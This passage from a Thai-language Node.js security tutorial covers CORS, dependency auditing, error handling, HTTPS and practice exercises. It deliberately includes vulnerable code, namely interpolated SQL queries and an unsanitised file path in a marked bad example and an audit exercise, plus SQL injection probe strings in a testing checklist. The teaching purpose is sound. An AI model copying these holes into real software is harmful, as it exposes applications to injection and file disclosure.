const secretsClient = new SecretsManagerClient({ region: 'ap-southeast-1' });

async function getSecret(secretName) {
  const command = new GetSecretValueCommand({ SecretId: secretName });
  const response = await secretsClient.send(command);
  return JSON.parse(response.SecretString);
}

// โหลด secrets ตอน startup
async function loadSecrets() {
  const dbSecrets = await getSecret('myapp/database');
  const jwtSecrets = await getSecret('myapp/jwt');
  
  process.env.DATABASE_URL = dbSecrets.url;
  process.env.JWT_SECRET = jwtSecrets.secret;
}
```

---

## Step 1343: CORS Configuration

```javascript
// ===== CORS (Cross-Origin Resource Sharing) =====
import cors from 'cors';

// ❌ อย่าทำแบบนี้ (เปิดกว้างเกินไป)
app.use(cors()); // อนุญาตทุก origin!

// ✅ กำหนด allowed origins ชัดเจน
const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000', 'http://localhost:5173'] : []),
];

const corsOptions = {
  origin: (origin, callback) => {
    // อนุญาต requests ที่ไม่มี origin (เช่น curl, mobile apps)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`CORS blocked: ${origin}`);
      callback(new Error('Not allowed by CORS'));
    }
  },
  
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-CSRF-Token',
    'X-Requested-With',
  ],
  
  exposedHeaders: ['X-Total-Count', 'X-Page'],
  
  credentials: true, // อนุญาต cookies
  
  maxAge: 86400, // cache preflight 24 ชั่วโมง
};

app.use(cors(corsOptions));

// Handle OPTIONS preflight
app.options('*', cors(corsOptions));

// ===== Custom CORS Middleware =====
function strictCORS(req, res, next) {
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin'); // สำคัญมาก! สำหรับ caching
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Max-Age', '86400');
  
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }
  
  next();
}
```

---

## Step 1344: npm Dependency Security

```bash
# ตรวจสอบ vulnerabilities
npm audit

# แก้ไขอัตโนมัติ
npm audit fix

# แก้ไข breaking changes ด้วย
npm audit fix --force

# ดู report แบบละเอียด
npm audit --json

# อัปเดต packages ทั้งหมด
npm update

# ตรวจสอบ outdated packages
npm outdated
```

```javascript
// ===== package.json: Security Settings =====
{
  "engines": {
    "node": ">=18.0.0",  // กำหนด minimum version
    "npm": ">=9.0.0"
  },
  
  // ล็อค exact versions
  "dependencies": {
    "express": "4.18.2",  // Exact version (ไม่ใช้ ^)
    "bcrypt": "5.1.1"
  }
}

// ===== CI/CD Integration =====
// .github/workflows/security.yml
/*
name: Security Audit

on:
  push:
    branches: [ main ]
  schedule:
    - cron: '0 9 * * 1'  # ทุกวันจันทร์ 9am

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm ci
      - run: npm audit --audit-level=high
        # fail ถ้ามี vulnerabilities ระดับ high+
*/

// ===== Snyk Integration =====
// npm install -g snyk
// snyk auth
// snyk test
// snyk monitor

// ===== .npmrc สำหรับ security =====
// audit=true
// fund=false
// package-lock=true
// save-exact=true  # บันทึก exact version
```

---

## Step 1345: Error Handling Security

```javascript
// ===== ไม่รั่วข้อมูล sensitive ใน error messages =====

// ❌ ช่องโหว่ - เปิดเผย internal info
app.get('/api/users/:id', async (req, res) => {
  try {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
    res.json(user);
  } catch (error) {
    // ❌ เปิดเผย stack trace, SQL query, database structure
    res.status(500).json({ error: error.message, stack: error.stack });
  }
});

// ✅ ปลอดภัย - Generic error messages
class AppError extends Error {
  constructor(message, statusCode, isOperational = true) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = isOperational;
    Error.captureStackTrace(this, this.constructor);
  }
}

// Centralized error handler
function errorHandler(err, req, res, next) {
  // Log error ทั้งหมด (สำหรับ debugging)
  console.error({
    message: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    ip: req.ip,
    userId: req.user?.id,
    timestamp: new Date().toISOString(),
  });
  
  // ส่ง generic message ให้ client
  if (err.isOperational) {
    // Operational errors: safe to send to client
    res.status(err.statusCode || 500).json({
      status: 'error',
      message: err.message,
    });
  } else {
    // Programming errors: generic message
    res.status(500).json({
      status: 'error',
      message: process.env.NODE_ENV === 'production'
        ? 'เกิดข้อผิดพลาดภายในระบบ กรุณาลองอีกครั้ง'
        : err.message,
    });
  }
}

// ตัวอย่าง operational errors (ส่ง message ให้ client ได้)
function validateUser(userId) {
  if (!userId) throw new AppError('กรุณาระบุ User ID', 400);
  if (isNaN(userId)) throw new AppError('User ID ต้องเป็นตัวเลข', 400);
}

// ===== Error Logging =====
import winston from 'winston';

const logger = winston.createLogger({
  level: 'error',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  transports: [
    // บันทึกลงไฟล์
    new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
    // บันทึก combined log
    new winston.transports.File({ filename: 'logs/combined.log' }),
  ],
});

// ส่งไป external service (Sentry, Datadog, etc.)
if (process.env.NODE_ENV === 'production') {
  // Sentry
  import * as Sentry from '@sentry/node';
  Sentry.init({ dsn: process.env.SENTRY_DSN });
}
```

---

## Step 1346-1350: Security Checklist และ Best Practices

```javascript
// ===== Security Checklist =====

// ✅ Input Validation
// - Validate ทุก input ที่มาจาก user
// - ใช้ whitelist (อนุญาตเฉพาะที่กำหนด) แทน blacklist
// - Sanitize data ก่อน process

// ✅ Authentication
// - Hash passwords ด้วย bcrypt/argon2
// - ใช้ JWT อย่างถูกต้อง
// - Implement MFA
// - Rate limit login attempts

// ✅ Authorization
// - ตรวจสอบ permissions ทุก request
// - Principle of Least Privilege
// - ไม่เชื่อถือ client-side authorization

// ✅ Data Security
// - Encrypt sensitive data at rest
// - ใช้ HTTPS (TLS 1.2+)
// - Secure cookies

// ✅ Code Security
// - ไม่ commit secrets
// - ตรวจสอบ dependencies สม่ำเสมอ
// - ใช้ CSP headers

// ===== Security Testing =====
import { exec } from 'child_process';

// ตรวจสอบด้วย OWASP ZAP
// docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000

// ตรวจสอบ SSL/TLS
// ssllabs.com/ssltest/

// ตรวจสอบ Headers
// securityheaders.com

// Penetration Testing checklist
const securityChecks = {
  xss: [
    'Test all input fields',
    'Test URL parameters',
    'Test cookie values',
    'Test HTTP headers',
  ],
  
  sqli: [
    "Test with single quote: '",
    'Test with OR 1=1',
    'Test time-based blind SQLi',
  ],
  
  csrf: [
    'Verify CSRF tokens present',
    'Test token uniqueness',
    'Test token expiration',
  ],
  
  auth: [
    'Test password policy',
    'Test account lockout',
    'Test session expiration',
    'Test JWT validation',
  ],
};

// ===== Dependency Security Automation =====
// package.json scripts
const scripts = {
  "security:audit": "npm audit --audit-level=moderate",
  "security:outdated": "npm outdated",
  "security:snyk": "snyk test",
  "security:headers": "node scripts/check-headers.js",
  "precommit": "npm run security:audit"
};

// ===== HTTPS Configuration =====
import https from 'https';
import fs from 'fs';

const httpsOptions = {
  cert: fs.readFileSync('certificates/cert.pem'),
  key: fs.readFileSync('certificates/key.pem'),
  
  // TLS settings
  secureProtocol: 'TLS_method',
  minVersion: 'TLSv1.2',
  ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
  ].join(':'),
  honorCipherOrder: true,
};

https.createServer(httpsOptions, app).listen(443);

// Redirect HTTP to HTTPS
http.createServer((req, res) => {
  res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });
  res.end();
}).listen(80);
```

---

## แบบฝึกหัด

### แบบฝึกหัดที่ 1: XSS Prevention
สร้าง comment system ที่ปลอดภัย:
- รับ HTML input จากผู้ใช้
- Sanitize ด้วย DOMPurify
- แสดงผลอย่างปลอดภัย
- เพิ่ม CSP header

### แบบฝึกหัดที่ 2: Secure Login
สร้าง login endpoint ที่:
- Validate input ด้วย Joi
- Rate limit 5 attempts/15min
- Log failed attempts
- Return generic error message

### แบบฝึกหัดที่ 3: JWT Security
- สร้าง access token (15 นาที) และ refresh token (7 วัน)
- Implement token blacklisting ด้วย Redis
- เพิ่ม Token rotation ทุกครั้งที่ refresh

### แบบฝึกหัดที่ 4: File Upload
สร้าง secure file upload ที่:
- ตรวจสอบ file type จาก magic bytes
- ลบ EXIF data ออกจากรูปภาพ
- บันทึกไฟล์นอก web root
- Serve ผ่าน authenticated endpoint

### แบบฝึกหัดที่ 5: Security Audit
ตรวจสอบโค้ดต่อไปนี้และหาช่องโหว่:

```javascript
app.post('/api/search', async (req, res) => {
  const { query, userId } = req.body;
  
  const results = await db.query(
    `SELECT * FROM products WHERE name LIKE '%${query}%' 
     AND seller_id = ${userId}`
  );
  
  res.json({ results, total: results.length });
});

app.get('/api/user-file', (req, res) => {
  const file = req.query.file;
  res.sendFile(`/uploads/${file}`);
});
```

---

## สรุป

| ช่องโหว่ | วิธีป้องกัน |
|--------|-----------|
| XSS | textContent, DOMPurify, CSP |
| SQL Injection | Parameterized queries, ORM |
| CSRF | CSRF tokens, SameSite cookies |
| Broken Auth | bcrypt, JWT, MFA, rate limit |
| Sensitive Data | Encryption, HTTPS, secure cookies |
| Bad Dependencies | npm audit, Snyk |
| File Upload | Magic bytes check, path validation |
| CORS | Strict origin whitelist |
| Error Exposure | Generic error messages, logging |
| Env Security | Secrets manager, never commit secrets |
